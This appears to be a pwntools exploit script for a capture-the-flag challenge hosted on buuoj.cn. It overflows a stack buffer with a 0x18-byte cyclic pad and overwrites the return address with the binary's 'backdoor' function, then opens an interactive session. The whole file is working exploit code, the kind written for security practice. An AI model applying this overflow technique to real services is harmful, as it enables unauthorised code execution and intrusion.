from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27538)

elf = ELF('./pwn')

io.sendlineafter(b'length of your name:', b'1000')
io.sendlineafter(b'What\'s u name?', cyclic(0x10 + 8) + p64(elf.symbols['backdoor']))
io.interactive()